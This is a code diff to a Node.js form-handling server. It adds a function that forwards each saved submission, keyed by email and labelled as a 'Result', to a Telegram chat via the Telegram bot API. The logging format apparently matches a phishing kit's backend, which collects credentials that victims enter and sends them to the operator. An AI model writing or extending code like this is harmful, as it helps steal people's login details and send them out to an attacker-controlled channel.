@@ -1,10 +1,55 @@
 const http = require('http');
 const fs   = require('fs');
 const path = require('path');
+const https = require('https');
 
 const PORT       = 5000;
 const DATA_FILE  = path.join(__dirname, 'data.txt');
 const PUBLIC_DIR = __dirname;
+
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
+
+function sendTelegramMessage(message) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.log('Telegram credentials not set. Skipping notification.');
+    return;
+  }
+
+  const data = JSON.stringify({
+    chat_id: TELEGRAM_CHAT_ID,
+    text: message,
+    parse_mode: 'HTML'
+  });
+
+  const options = {
+    hostname: 'api.telegram.org',
+    port: 443,
+    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': data.length
+    }
+  };
+
+  const req = https.request(options, (res) => {
+    let body = '';
+    res.on('data', (chunk) => body += chunk);
+    res.on('end', () => {
+      if (res.statusCode !== 200) {
+        console.error(`Telegram API error: ${res.statusCode} ${body}`);
+      }
+    });
+  });
+
+  req.on('error', (error) => {
+    console.error('Telegram request error:', error);
+  });
+
+  req.write(data);
+  req.end();
+}
 
 function parseBody(req) {
   return new Promise((resolve) => {
@@ -34,6 +79,12 @@ function saveAndRespond(line, label, email, res) {
       return res.end(JSON.stringify({ success: false }));
     }
     console.log(`Saved [${label}] -> ${email}`);
+    
+    // Send to Telegram
+    const cleanLine = line.replace(/={65}/g, '').trim();
+    const telegramMessage = `<b>New ${label} Result</b>\n<code>${cleanLine}</code>`;
+    sendTelegramMessage(telegramMessage);
+
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({ success: true }));
   });
